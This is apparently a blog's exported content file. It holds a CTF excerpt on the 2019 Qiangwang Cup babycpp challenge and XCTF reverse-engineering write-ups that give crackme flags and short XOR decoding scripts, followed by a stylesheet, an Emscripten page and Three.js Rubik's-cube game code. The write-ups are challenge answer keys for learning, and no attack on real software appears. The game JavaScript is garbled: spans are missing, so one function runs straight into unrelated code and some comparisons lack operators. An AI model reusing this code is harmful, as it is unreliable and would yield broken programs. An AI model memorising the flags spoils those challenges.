{"meta":{"title":"4eriri's blog","subtitle":null,"description":null,"author":"4eriri","url":"http://yoursite.com"},"pages":[{"title":"强网杯2019-babycpp","date":"2019-05-29T14:36:35.000Z","updated":"2019-06-12T13:34:53.220Z","comments":true,"path":"强网杯2019-babycpp.html","permalink":"http://yoursite.com/强网杯2019-babycpp.html","excerpt":"人人人师傅tql，我大哥是人人人.jpg。","text":"人人人师傅tql，我大哥是人人人.jpg。 程序功能 new array show element set element update hash exit 其中，最多可以new 16个array，并且可以选择new int array或者string array，两者在show element和set element时实际调用的函数不同，就是c++中的虚函数的概念。"},{"title":"XCTF攻防世界REVERSE","date":"2019-05-21T05:49:20.000Z","updated":"2019-05-28T16:17:25.302Z","comments":true,"path":"XCTF攻防世界REVERSE.html","permalink":"http://yoursite.com/XCTF攻防世界REVERSE.html","excerpt":"菜鸡还是从刷题做起吧……","text":"菜鸡还是从刷题做起吧…… 001 dmd-50输入md5后与780438d5b6e29db0898bc4f0225935c0进行比较，md5解密后得正确输入 b781cbb29054db12f88f08c6e161c199。 002 Shuffle明文flag SECCON{Welcome to the SECCON 2014 CTF!} 003 crackmeESP定律脱壳，简单加密 逆运算脚本： 123key=&quot;this_is_not_flag&quot;s=[0x12, 0x04, 0x08, 0x14, 0x24, 0x5C, 0x4A, 0x3D, 0x56, 0x0A, 0x10, 0x67,0x0,0x41, 0x0,0x01, 0x46, 0x5A, 0x44, 0x42, 0x6E, 0x0C, 0x44, 0x72, 0x0C, 0x0D, 0x40, 0x3E, 0x4B, 0x5F, 0x02, 0x01, 0x4C, 0x5E, 0x5B, 0x17, 0x6E, 0x0C, 0x16, 0x68, 0x5B, 0x12, 0x48,0x0e]print &apos;&apos;.join([chr(s[i]^ord(key[i%16]))for i in range(42)]) flag{59b8ed8f-af22-11e7-bb4a-3cf862d1ee75} 004 re2-cpp-is-awesome根据给的index表在table中取值得到flag： 123table=&quot;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_&#123;FL4G&#125;_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&quot;index=[36, 0, 0, 0, 0, 0, 0, 0, 5, 0, 0, 0, 54, 0, 0, 0, 101, 0, 0, 0, 7, 0, 0, 0, 39, 0, 0, 0, 38, 0, 0, 0, 45, 0, 0, 0, 1, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 13, 0, 0, 0, 86, 0, 0, 0, 1, 0, 0, 0, 3, 0, 0, 0, 101, 0, 0, 0, 3, 0, 0, 0, 45, 0, 0, 0, 22, 0, 0, 0, 2, 0, 0, 0, 21, 0, 0, 0, 3, 0, 0, 0, 101, 0, 0, 0, 0, 0, 0, 0, 41, 0, 0, 0, 68, 0, 0, 0, 68, 0, 0, 0, 1, 0, 0, 0, 68, 0, 0, 0, 43, 0, 0, 0]print &apos;&apos;.join([table[index[i]] for i in range(0,len(index),4)]) ALEXCTF{W3_L0v3_C_W1th_CL45535} 005 re-for-50-plz-50MIPS汇编 输入的每个字符异或0x37后与cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ比较 逆运算得flag：TUCTF{but_really_whoisjohngalt} 006 The Maya Society这题有点脑洞 计算机时间改为2012-12-21运行程序即可得到flag: flag{e3a03c6f3fe91b40eaa8e71b41f0db12} 007 key运行程序会报：&quot;?W?h?a?t h?a?p?p?e?n?&quot; ida分析一波发现是读取不到C:\\\\Users\\\\CSAW2016\\\\haha\\\\flag_dir\\\\flag.txt，所以报错，建立该文件，继续运行。再次运行会提示=W=r=o=n=g=K=e=y= 定位到此处： 1234567891011121314151617181920212223if ( sub_4020C0(&amp;v44, v12, v45, (int)v13, v48) ) &#123; v28 = sub_402A00(std::cout, &quot;=W=r=o=n=g=K=e=y=&quot;, sub_402C50); &#125; else &#123; v14 = sub_402A00(std::cout, &quot;|------------------------------|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v14, v15); v16 = sub_402A00(std::cout, &quot;|==============================|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v16, v17); v18 = sub_402A00(std::cout, &quot;|==============================|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v18, v19); v20 = sub_402A00(std::cout, &quot;|==============================|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v20, v21); v22 = sub_402A00(std::cout, &quot;\\\\ /\\\\ /\\\\ /\\\\ /\\\\==============|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v22, v23); v24 = sub_402A00(std::cout, &quot; \\\\/ \\\\/ \\\\/ \\\\/ \\\\=============|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v24, v25); v26 = sub_402A00(std::cout, &quot; |-------------|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v26, v27); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(std::cout, sub_402C50); v28 = sub_402A00(std::cout, &quot;Congrats You got it!&quot;, sub_402C50); &#125; 使用od跟进sub_4020c0，调试发现是在进行字符串比较4eriri是我自己建立的flag.txt中的内容，比较的字符串可能就是正确的flag，提交发现正确。 idg_cni~bjbfi|gsxb 008 simple-check-100给了三个文件，随便找一个逆一下就ok了 1234567891011121314unsigned char flagdata[28]=&#123;0xDC, 0x17, 0xBF, 0x5B, 0xD4, 0x0A, 0xD2, 0x1B, 0x7D, 0xDA, 0xA7, 0x95, 0xB5, 0x32, 0x10, 0xF6, 0x1C, 0x65, 0x53, 0x53, 0x67, 0xBA, 0xEA, 0x6E, 0x78, 0x22, 0x72, 0xD3&#125;;unsigned int a1[7]=&#123;0xe37ec854,0x9a16c764,0x326511cd,0x43d3e32d,0xd29da992,0xd32c6de6,0x6afebdb6&#125;;for(int i=0;i&lt;7;i++) a1[i]^=0xdeadbeef;unsigned char key[28]=&#123;0&#125;;memcpy(key,a1,28);unsigned char flag[28]=&#123;0&#125;;for(int i=0;i&lt;28;i++)&#123; flag[i]=flagdata[i]^key[i]; printf(&quot;%c&quot;,flag[i]);&#125; 脚本有点小小的问题，自己读一下flag flag_is_you_know_cracking!!!"},{"title":"","date":"2019-08-17T13:23:40.276Z","updated":"2019-08-17T13:09:30.000Z","comments":true,"path":"i/css/style.css","permalink":"http://yoursite.com/i/css/style.css","excerpt":"","text":"*, *:before, *:after { -webkit-user-select: none; -moz-user-select: none; user-select: none; box-sizing: border-box; cursor: inherit; margin: 0; padding: 0; outline: none; font-size: inherit; font-family: inherit; font-weight: inherit; font-style: inherit; text-transform: uppercase; } *:focus { outline: none; } html { -webkit-tap-highlight-color: transparent; -webkit-text-size-adjust: 100%; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; -ms-text-size-adjust: 100%; -webkit-text-size-adjust: 100%; overflow: hidden; height: 100%; } body { font-family: \"BungeeFont\", sans-serif; font-weight: normal; font-style: normal; line-height: 1; cursor: default; overflow: hidden; height: 100%; font-size: 5rem; } .icon { display: inline-block; font-size: inherit; overflow: visible; vertical-align: -0.125em; preserveAspectRatio: none; } .range { position: relative; width: 14em; z-index: 1; opacity: 0; } .range:not(:last-child) { margin-bottom: 2em; } .range__label { position: relative; font-size: 0.9em; line-height: 0.75em; padding-bottom: 0.5em; z-index: 2; } .range__track { position: relative; height: 1em; margin-left: 0.5em; margin-right: 0.5em; z-index: 3; } .range__track-line { position: absolute; background: rgba(0, 0, 0, 0.2); height: 2px; top: 50%; margin-top: -1px; left: -0.5em; right: -0.5em; transform-origin: left center; } .range__handle { position: absolute; width: 0; height: 0; top: 50%; left: 0; cursor: pointer; z-index: 1; } .range__handle div { transition: background 500ms ease; position: absolute; left: 0; top: 0; width: 0.9em; height: 0.9em; border-radius: 0.2em; margin-left: -0.45em; margin-top: -0.45em; background: #41aac8; border-bottom: 2px solid rgba(0, 0, 0, 0.2); } .range.is-active .range__handle div { transform: scale(1.25); } .range__handle:after { content: \"\"; position: absolute; left: 0; top: 0; width: 3em; height: 3em; margin-left: -1.5em; margin-top: -1.5em; } .range__list { display: flex; flex-flow: row nowrap; justify-content: space-between; position: relative; padding-top: 0.5em; font-size: 0.55em; color: rgba(0, 0, 0, 0.5); z-index: 1; } .stats { position: relative; width: 14em; z-index: 1; display: flex; justify-content: space-between; opacity: 0; } .stats:not(:last-child) { margin-bottom: 1.5em; } .stats i { display: inline-block; color: rgba(0, 0, 0, 0.5); font-size: 0.9em; } .stats b { display: inline-block; font-size: 0.9em; } .text { position: absolute; left: 0; right: 0; text-align: center; line-height: 0.75; perspective: 100rem; opacity: 0; } .text i { display: inline-block; opacity: 0; white-space: pre-wrap; } .text--title { bottom: 75%; font-size: 4.4em; height: 1.2em; } .text--title span { display: block; } .text--title span:first-child { font-size: 0.5em; margin-bottom: 0.2em; } .text--note { top: 87%; font-size: 1em; } .text--timer { bottom: 78%; font-size: 3.5em; line-height: 1; } .text--complete, .text--best-time { font-size: 1.5em; top: 83%; line-height: 1em; } .btn { -webkit-appearance: none; -moz-appearance: none; appearance: none; background-color: transparent; border-radius: 0; border-width: 0; position: absolute; pointer-events: none; font-size: 1.2em; color: rgba(0, 0, 0, 0.25); opacity: 0; } .btn:after { position: absolute; content: \"\"; width: 3em; height: 3em; left: 50%; top: 50%; margin-left: -1.5em; margin-top: -1.5em; border-radius: 100%; } .btn--bl { bottom: 0.8em; left: 0.8em; } .btn--br { bottom: 0.8em; right: 0.8em; } .btn--bc { bottom: 0.8em; left: calc(50% - 0.5em); } .btn--pwa { transition: color 500ms ease; color: inherit; height: 1em; } .btn--pwa svg { font-size: 0.6em; margin: 0.35em 0; } .btn svg { display: block; } .ui { pointer-events: none; color: #070d15; } .ui, .ui__background, .ui__game, .ui__texts, .ui__prefs, .ui__stats, .ui__buttons { position: absolute; top: 0; left: 0; width: 100%; height: 100%; overflow: hidden; } .ui__background { z-index: 1; transition: background 500ms ease; background: #d1d5db; } .ui__background:after { position: absolute; top: 0; left: 0; width: 100%; height: 100%; content: \"\"; background-image: linear-gradient(to bottom, white 50%, rgba(255, 255, 255, 0) 100%); } .ui__game { pointer-events: all; z-index: 2; } .ui__game canvas { display: block; width: 100%; height: 100%; } .ui__texts { z-index: 3; } .ui__prefs, .ui__stats { display: flex; flex-flow: column nowrap; justify-content: center; align-items: center; overflow: hidden; z-index: 4; } .ui__buttons { z-index: 5; } .ui__notification { transition: transform 500ms ease, opacity 500ms ease; font-family: sans-serif; position: absolute; left: 50%; bottom: 0.6em; padding: 0.6em; margin-left: -9.4em; width: 18.8em; z-index: 6; background: rgba(17, 17, 17, 0.9); border-radius: 0.8em; display: flex; align-items: center; flex-flow: row nowrap; color: #fff; user-select: none; opacity: 0; pointer-events: none; transform: translateY(100%); } .ui__notification.is-active { opacity: 1; pointer-events: all; transform: none; } .ui__notification * { text-transform: none; } .ui__notification-icon { background-size: 100% 100%; left: 0.6em; top: 0.6em; width: 2.8em; height: 2.8em; border-radius: 0.5em; background: #fff; margin-right: 0.6em; display: block; } .ui__notification-text { font-size: 0.75em; line-height: 1.4em; } .ui__notification-text .icon { color: #4f82fd; font-size: 1.1em; } .ui__notification-text b { font-weight: 700; } .btn--stats { visibility: hidden; }"},{"title":"","date":"2019-08-17T13:53:13.613Z","updated":"2019-05-20T16:39:34.000Z","comments":true,"path":"i/wasm/webassembly.html","permalink":"http://yoursite.com/i/wasm/webassembly.html","excerpt":"","text":"Emscripten-Generated Code #bbody{ background: linear-gradient(-180deg, #BCC5CE 0%, #929EAD 98%), radial-gradient(at top left, rgba(255,255,255,0.30) 0%, rgba(0,0,0,0.30) 100%); background-blend-mode: screen; } #output { width: 900px; height: 200px; margin: 0 auto; margin-top: 10px; border-left: 0px; border-right: 0px; padding-left: 0px; padding-right: 0px; display: block; background-color: black; color: white; font-family: 'Lucida Console', Monaco, monospace; outline: none; } Downloading... blog Maybe u can try input FLAG?? var statusElement = document.getElementById('status'); var progressElement = document.getElementById('progress'); var spinnerElement = document.getElementById('spinner'); var Module = { preRun: [], postRun: [], print: (function() { var element = document.getElementById('output'); if (element) element.value = ''; // clear browser cache return function(text) { if (arguments.length > 1) text = Array.prototype.slice.call(arguments).join(' '); // These replacements are necessary if you render to raw HTML //text = text.replace(/&/g, \"&amp;\"); //text = text.replace(//g, \"&gt;\"); //text = text.replace('\\n', '', 'g'); console.log(text); if (element) { element.value += text + \"\\n\"; element.scrollTop = element.scrollHeight; // focus on bottom } }; })(), printErr: function(text) { if (arguments.length > 1) text = Array.prototype.slice.call(arguments).join(' '); console.error(text); }, canvas: (function() { var canvas = document.getElementById('canvas'); // As a default initial behavior, pop up an alert when webgl context is lost. To make your // application robust, you may want to override this behavior before shipping! // See http://www.khronos.org/registry/webgl/specs/latest/1.0/#5.15.2 canvas.addEventListener(\"webglcontextlost\", function(e) { alert('WebGL context lost. You will need to reload the page.'); e.preventDefault(); }, false); return canvas; })(), setStatus: function(text) { if (!Module.setStatus.last) Module.setStatus.last = { time: Date.now(), text: '' }; if (text === Module.setStatus.last.text) return; var m = text.match(/([^(]+)\\((\\d+(\\.\\d+)?)\\/(\\d+)\\)/); var now = Date.now(); if (m && now - Module.setStatus.last.time < 30) return; // if this is a progress update, skip it if too soon Module.setStatus.last.time = now; Module.setStatus.last.text = text; if (m) { text = m[1]; progressElement.value = parseInt(m[2])*100; progressElement.max = parseInt(m[4])*100; progressElement.hidden = false; spinnerElement.hidden = false; } else { progressElement.value = null; progressElement.max = null; progressElement.hidden = true; if (!text) spinnerElement.style.display = 'none'; } statusElement.innerHTML = text; }, totalDependencies: 0, monitorRunDependencies: function(left) { this.totalDependencies = Math.max(this.totalDependencies, left); Module.setStatus(left ? 'Preparing... (' + (this.totalDependencies-left) + '/' + this.totalDependencies + ')' : 'All downloads complete.'); } }; Module.setStatus('Downloading...'); window.onerror = function(event) { // TODO: do not warn on ok events like simulating an infinite loop or exitStatus Module.setStatus('Exception thrown, see JavaScript console'); spinnerElement.style.display = 'none'; Module.setStatus = function(text) { if (text) Module.printErr('[post-exception status] ' + text); }; }; L2Dwidget.init({\"pluginRootPath\":\"live2dw/\",\"pluginJsPath\":\"lib/\",\"pluginModelPath\":\"assets/\",\"tagMode\":false,\"debug\":false,\"model\":{\"jsonPath\":\"/live2dw/assets/wanko.model.json\"},\"display\":{\"position\":\"right\",\"width\":100,\"height\":200},\"mobile\":{\"show\":true},\"log\":false});"},{"title":"","date":"2019-08-17T13:23:40.277Z","updated":"2019-08-17T13:07:52.000Z","comments":true,"path":"i/js/index.js","permalink":"http://yoursite.com/i/js/index.js","excerpt":"","text":"// Three.js - https://github.com/mrdoob/three.js/ // RoundedBoxGeometry - https://github.com/pailhead/three-rounded-box const animationEngine = ( () => { let uniqueID = 0; class AnimationEngine { constructor() { this.ids = []; this.animations = {}; this.update = this.update.bind( this ); this.raf = 0; this.time = 0; } update() { const now = performance.now(); const delta = now - this.time; this.time = now; let i = this.ids.length; this.raf = i ? requestAnimationFrame( this.update ) : 0; while ( i-- ) this.animations[ this.ids[ i ] ] && this.animations[ this.ids[ i ] ].update( delta ); } add( animation ) { animation.id = uniqueID ++; this.ids.push( animation.id ); this.animations[ animation.id ] = animation; if ( this.raf !== 0 ) return; this.time = performance.now(); this.raf = requestAnimationFrame( this.update ); } remove( animation ) { const index = this.ids.indexOf( animation.id ); if ( index < 0 ) return; this.ids.splice( index, 1 ); delete this.animations[ animation.id ]; animation = null; } } return new AnimationEngine(); } )(); class Animation { constructor( start ) { if ( start === true ) this.start(); } start() { animationEngine.add( this ); } stop() { animationEngine.remove( this ); } update( delta ) {} } class World extends Animation { constructor( game ) { super( true ); this.game = game; this.container = this.game.dom.game; this.scene = new THREE.Scene(); this.renderer = new THREE.WebGLRenderer( { antialias: true, alpha: true } ); this.renderer.setPixelRatio( window.devicePixelRatio ); this.container.appendChild( this.renderer.domElement ); this.camera = new THREE.PerspectiveCamera( 2, 1, 0.1, 10000 ); this.stage = { width: 2, height: 3 }; this.fov = 10; this.createLights(); this.onResize = []; this.resize(); window.addEventListener( 'resize', () => this.resize(), false ); } update() { this.renderer.render( this.scene, this.camera ); } resize() { this.width = this.container.offsetWidth; this.height = this.container.offsetHeight; this.renderer.setSize( this.width, this.height ); this.camera.fov = this.fov; this.camera.aspect = this.width / this.height; const aspect = this.stage.width / this.stage.height; const fovRad = this.fov * THREE.Math.DEG2RAD; let distance = ( aspect < this.camera.aspect ) ? ( this.stage.height / 2 ) / Math.tan( fovRad / 2 ) : ( this.stage.width / this.camera.aspect ) / ( 2 * Math.tan( fovRad / 2 ) ); distance *= 0.5; this.camera.position.set( distance, distance, distance); this.camera.lookAt( this.scene.position ); this.camera.updateProjectionMatrix(); const docFontSize = ( aspect < this.camera.aspect ) ? ( this.height / 100 ) * aspect : this.width / 100; document.documentElement.style.fontSize = docFontSize + 'px'; if ( this.onResize ) this.onResize.forEach( cb => cb() ); } createLights() { this.lights = { holder: new THREE.Object3D, ambient: new THREE.AmbientLight( 0xffffff, 0.69 ), front: new THREE.DirectionalLight( 0xffffff, 0.36 ), back: new THREE.DirectionalLight( 0xffffff, 0.19 ), }; this.lights.front.position.set( 1.5, 5, 3 ); this.lights.back.position.set( -1.5, -5, -3 ); this.lights.holder.add( this.lights.ambient ); this.lights.holder.add( this.lights.front ); this.lights.holder.add( this.lights.back ); this.scene.add( this.lights.holder ); } enableShadows() { this.renderer.shadowMap.enabled = true; this.renderer.shadowMap.type = THREE.PCFSoftShadowMap; this.lights.front.castShadow = true; this.lights.front.shadow.mapSize.width = 512; this.lights.front.shadow.mapSize.height = 512; var d = 1.5; this.lights.front.shadow.camera.left = -d; this.lights.front.shadow.camera.right = d; this.lights.front.shadow.camera.top = d; this.lights.front.shadow.camera.bottom = -d; this.lights.front.shadow.camera.near = 1; this.lights.front.shadow.camera.far = 9; this.game.cube.holder.traverse( node => { if ( node instanceof THREE.Mesh ) { node.castShadow = true; node.receiveShadow = true; } } ); } } function RoundedBoxGeometry( size, radius, radiusSegments ) { THREE.BufferGeometry.call( this ); this.type = 'RoundedBoxGeometry'; radiusSegments = ! isNaN( radiusSegments ) ? Math.max( 1, Math.floor( radiusSegments ) ) : 1; var width, height, depth; width = height = depth = size; radius = size * radius; radius = Math.min( radius, Math.min( width, Math.min( height, Math.min( depth ) ) ) / 2 ); var edgeHalfWidth = width / 2 - radius; var edgeHalfHeight = height / 2 - radius; var edgeHalfDepth = depth / 2 - radius; this.parameters = { width: width, height: height, depth: depth, radius: radius, radiusSegments: radiusSegments }; var rs1 = radiusSegments + 1; var totalVertexCount = ( rs1 * radiusSegments + 1 ) { const piece = new THREE.Object3D(); const pieceCube = pieceMesh.clone(); const pieceEdges = []; piece.position.copy( position.clone().divideScalar( 3 ) ); piece.add( pieceCube ); piece.name = index; piece.edgesName = ''; position.edges.forEach( position => { const edge = new THREE.Mesh( edgeGeometry, mainMaterial.clone() ); const name = [ 'L', 'R', 'D', 'U', 'B', 'F' ][ position ]; const distance = pieceSize / 2; edge.position.set( distance * [ - 1, 1, 0, 0, 0, 0 ][ position ], distance * [ 0, 0, - 1, 1, 0, 0 ][ position ], distance * [ 0, 0, 0, 0, - 1, 1 ][ position ] ); edge.rotation.set( Math.PI / 2 * [ 0, 0, 1, - 1, 0, 0 ][ position ], Math.PI / 2 * [ - 1, 1, 0, 0, 2, 0 ][ position ], 0 ); edge.scale.set( this.geometry.edgeScale, this.geometry.edgeScale, this.geometry.edgeScale ); edge.name = name; piece.add( edge ); pieceEdges.push( name ); this.edges.push( edge ); } ); piece.userData.edges = pieceEdges; piece.userData.cube = pieceCube; piece.userData.start = { position: piece.position.clone(), rotation: piece.rotation.clone(), }; this.pieces.push( piece ); } ); } } const Easing = { Power: { In: power => { power = Math.round( power || 1 ); return t => Math.pow( t, power ); }, Out: power => { power = Math.round( power || 1 ); return t => 1 - Math.abs( Math.pow( t - 1, power ) ); }, InOut: power => { power = Math.round( power || 1 ); return t => ( t < 0.5 ) ? Math.pow( t * 2, power ) / 2 : ( 1 - Math.abs( Math.pow( ( t * 2 - 1 ) - 1, power ) ) ) / 2 + 0.5; }, }, Sine: { In: () => t => 1 + Math.sin( Math.PI / 2 * t - Math.PI / 2 ), Out: () => t => Math.sin( Math.PI / 2 * t ), InOut: () => t => ( 1 + Math.sin( Math.PI * t - Math.PI / 2 ) ) / 2, }, Back: { Out: s => { s = s || 1.70158; return t => { return ( t -= 1 ) * t * ( ( s + 1 ) * t + s ) + 1; }; }, In: s => { s = s || 1.70158; return t => { return t * t * ( ( s + 1 ) * t - s ); }; } }, Elastic: { Out: ( amplitude, period ) => { let PI2 = Math.PI * 2; let p1 = ( amplitude >= 1 ) ? amplitude : 1; let p2 = ( period || 0.3 ) / ( amplitude < 1 ? amplitude : 1 ); let p3 = p2 / PI2 * ( Math.asin( 1 / p1 ) || 0 ); p2 = PI2 / p2; return t => { return p1 * Math.pow( 2, -10 * t ) * Math.sin( ( t - p3 ) * p2 ) + 1 } }, }, }; class Tween extends Animation { constructor( options ) { super( false ); this.duration = options.duration || 500; this.easing = options.easing || ( t => t ); this.onUpdate = options.onUpdate || ( () => {} ); this.onComplete = options.onComplete || ( () => {} ); this.delay = options.delay || false; this.yoyo = options.yoyo ? false : null; this.progress = 0; this.value = 0; this.delta = 0; this.getFromTo( options ); if ( this.delay ) setTimeout( () => super.start(), this.delay ); else super.start(); this.onUpdate( this ); } update( delta ) { const old = this.value * 1; const direction = ( this.yoyo === true ) ? - 1 : 1; this.progress += ( delta / this.duration ) * direction; this.value = this.easing( this.progress ); this.delta = this.value - old; if ( this.values !== null ) this.updateFromTo(); if ( this.yoyo !== null ) this.updateYoyo(); else if ( this.progress 1 || this.progress < 0 ) { this.value = this.progress = ( this.progress > 1 ) ? 1 : 0; this.yoyo = ! this.yoyo; } this.onUpdate( this ); } updateFromTo() { this.values.forEach( key => { this.target[ key ] = this.from[ key ] + ( this.to[ key ] - this.from[ key ] ) * this.value; } ); } getFromTo( options ) { if ( ! options.target || ! options.to ) { this.values = null; return; } this.target = options.target || null; this.from = options.from || {}; this.to = options.to || null; this.values = []; if ( Object.keys( this.from ).length < 1 ) Object.keys( this.to ).forEach( key => { this.from[ key ] = this.target[ key ]; } ); Object.keys( this.to ).forEach( key => { this.values.push( key ); } ); } } window.addEventListener( 'touchmove', () => {} ); document.addEventListener( 'touchmove', event => { event.preventDefault(); }, { passive: false } ); class Draggable { constructor( element, options ) { this.position = { current: new THREE.Vector2(), start: new THREE.Vector2(), delta: new THREE.Vector2(), old: new THREE.Vector2(), drag: new THREE.Vector2(), }; this.options = Object.assign( { calcDelta: false, }, options || {} ); this.element = element; this.touch = null; this.drag = { start: ( event ) => { if ( event.type == 'mousedown' && event.which != 1 ) return; if ( event.type == 'touchstart' && event.touches.length > 1 ) return; this.getPositionCurrent( event ); if ( this.options.calcDelta ) { this.position.start = this.position.current.clone(); this.position.delta.set( 0, 0 ); this.position.drag.set( 0, 0 ); } this.touch = ( event.type == 'touchstart' ); this.onDragStart( this.position ); window.addEventListener( ( this.touch ) ? 'touchmove' : 'mousemove', this.drag.move, false ); window.addEventListener( ( this.touch ) ? 'touchend' : 'mouseup', this.drag.end, false ); }, move: ( event ) => { if ( this.options.calcDelta ) { this.position.old = this.position.current.clone(); } this.getPositionCurrent( event ); if ( this.options.calcDelta ) { this.position.delta = this.position.current.clone().sub( this.position.old ); this.position.drag = this.position.current.clone().sub( this.position.start ); } this.onDragMove( this.position ); }, end: ( event ) => { this.getPositionCurrent( event ); this.onDragEnd( this.position ); window.removeEventListener( ( this.touch ) ? 'touchmove' : 'mousemove', this.drag.move, false ); window.removeEventListener( ( this.touch ) ? 'touchend' : 'mouseup', this.drag.end, false ); }, }; this.onDragStart = () => {}; this.onDragMove = () => {}; this.onDragEnd = () => {}; this.enable(); return this; } enable() { this.element.addEventListener( 'touchstart', this.drag.start, false ); this.element.addEventListener( 'mousedown', this.drag.start, false ); return this; } disable() { this.element.removeEventListener( 'touchstart', this.drag.start, false ); this.element.removeEventListener( 'mousedown', this.drag.start, false ); return this; } getPositionCurrent( event ) { const dragEvent = event.touches ? ( event.touches[ 0 ] || event.changedTouches[ 0 ] ) : event; this.position.current.set( dragEvent.pageX, dragEvent.pageY ); } convertPosition( position ) { position.x = ( position.x / this.element.offsetWidth ) * 2 - 1; position.y = - ( ( position.y / this.element.offsetHeight ) * 2 - 1 ); return position; } } const STILL = 0; const PREPARING = 1; const ROTATING = 2; const ANIMATING = 3; class Controls { constructor( game ) { this.game = game; this.flipConfig = 0; this.flipEasings = [ Easing.Power.Out( 3 ), Easing.Sine.Out(), Easing.Back.Out( 2 ) ]; this.flipSpeeds = [ 125, 200, 350 ]; this.raycaster = new THREE.Raycaster(); const helperMaterial = new THREE.MeshBasicMaterial( { depthWrite: false, transparent: true, opacity: 0, color: 0x0033ff } ); this.group = new THREE.Object3D(); this.game.cube.object.add( this.group ); this.helper = new THREE.Mesh( new THREE.PlaneBufferGeometry( 20, 20 ), helperMaterial.clone(), ); this.helper.rotation.set( 0, Math.PI / 4, 0 ); this.game.world.scene.add( this.helper ); this.edges = new THREE.Mesh( new THREE.BoxBufferGeometry( 0.95, 0.95, 0.95 ), helperMaterial.clone(), ); this.game.world.scene.add( this.edges ); this.onSolved = () => {}; this.onMove = () => {}; this.momentum = []; this.scramble = null; this.state = STILL; this.initDraggable(); } enable() { this.draggable.enable(); } disable() { this.draggable.disable(); } initDraggable() { this.draggable = new Draggable( this.game.dom.game ); this.draggable.onDragStart = position => { if ( this.scramble !== null ) return; if ( this.state === PREPARING || this.state === ROTATING ) return; this.gettingDrag = this.state === ANIMATING; const edgeIntersect = this.getIntersect( position.current, this.edges, false ); if ( edgeIntersect !== false ) { this.dragNormal = edgeIntersect.face.normal.round(); this.flipType = 'layer'; this.attach( this.helper, this.edges ); this.helper.rotation.set( 0, 0, 0 ); this.helper.position.set( 0, 0, 0 ); this.helper.lookAt( this.dragNormal ); this.helper.translateZ( 0.5 ); this.helper.updateMatrixWorld(); this.detach( this.helper, this.edges ); } else { this.dragNormal = new THREE.Vector3( 0, 0, 1 ); this.flipType = 'cube'; this.helper.position.set( 0, 0, 0 ); this.helper.rotation.set( 0, Math.PI / 4, 0 ); this.helper.updateMatrixWorld(); } const planeIntersect = this.getIntersect( position.current, this.helper, false ).point; if ( planeIntersect === false ) return; this.dragCurrent = this.helper.worldToLocal( planeIntersect ); this.dragTotal = new THREE.Vector3(); this.state = ( this.state === STILL ) ? PREPARING : this.state; }; this.draggable.onDragMove = position => { if ( this.scramble !== null ) return; if ( this.state === STILL || ( this.state === ANIMATING && this.gettingDrag === false ) ) return; const planeIntersect = this.getIntersect( position.current, this.helper, false ); if ( planeIntersect === false ) return; const point = this.helper.worldToLocal( planeIntersect.point.clone() ); this.dragDelta = point.clone().sub( this.dragCurrent ).setZ( 0 ); this.dragTotal.add( this.dragDelta ); this.dragCurrent = point; this.addMomentumPoint( this.dragDelta ); if ( this.state === PREPARING && this.dragTotal.length() > 0.05 ) { this.dragDirection = this.getMainAxis( this.dragTotal ); if ( this.flipType === 'layer' ) { const direction = new THREE.Vector3(); direction[ this.dragDirection ] = 1; const worldDirection = this.helper.localToWorld( direction ).sub( this.helper.position ); const objectDirection = this.edges.worldToLocal( worldDirection ).round(); this.flipAxis = objectDirection.cross( this.dragNormal ).negate(); this.dragIntersect = this.getIntersect( position.current, this.game.cube.cubes, true ); this.selectLayer( this.getLayer( false ) ); } else { const axis = ( this.dragDirection != 'x' ) ? ( ( this.dragDirection == 'y' && position.current.x > this.game.world.width / 2 ) ? 'z' : 'x' ) : 'y'; this.flipAxis = new THREE.Vector3(); this.flipAxis[ axis ] = 1 * ( ( axis == 'x' ) ? - 1 : 1 ); } this.flipAngle = 0; this.state = ROTATING; } else if ( this.state === ROTATING ) { const rotation = this.dragDelta[ this.dragDirection ]; if ( this.flipType === 'layer' ) { this.group.rotateOnAxis( this.flipAxis, rotation ); this.flipAngle += rotation; } else { this.edges.rotateOnWorldAxis( this.flipAxis, rotation ); this.game.cube.object.rotation.copy( this.edges.rotation ); this.flipAngle += rotation; } } }; this.draggable.onDragEnd = position => { if ( this.scramble !== null ) return; if ( this.state !== ROTATING ) { this.gettingDrag = false; this.state = STILL; return; } this.state = ANIMATING; const momentum = this.getMomentum()[ this.dragDirection ]; const flip = ( Math.abs( momentum ) > 0.05 && Math.abs( this.flipAngle ) < Math.PI / 2 ); const angle = flip ? this.roundAngle( this.flipAngle + Math.sign( this.flipAngle ) * ( Math.PI / 4 ) ) : this.roundAngle( this.flipAngle ); const delta = angle - this.flipAngle; if ( this.flipType === 'layer' ) { this.rotateLayer( delta, false, layer => { this.state = this.gettingDrag ? PREPARING : STILL; this.gettingDrag = false; this.checkIsSolved(); } ); } else { this.rotateCube( delta, () => { this.state = this.gettingDrag ? PREPARING : STILL; this.gettingDrag = false; } ); } }; } rotateLayer( rotation, scramble, callback ) { const config = scramble ? 0 : this.flipConfig; const easing = this.flipEasings[ config ]; const duration = this.flipSpeeds[ config ]; const bounce = ( config == 2 ) ? this.bounceCube() : ( () => {} ); this.rotationTween = new Tween( { easing: easing, duration: duration, onUpdate: tween => { let deltaAngle = tween.delta * rotation; this.group.rotateOnAxis( this.flipAxis, deltaAngle ); bounce( tween.value, deltaAngle, rotation ); }, onComplete: () => { if ( ! scramble ) this.onMove(); const layer = this.flipLayer.slice( 0 ); 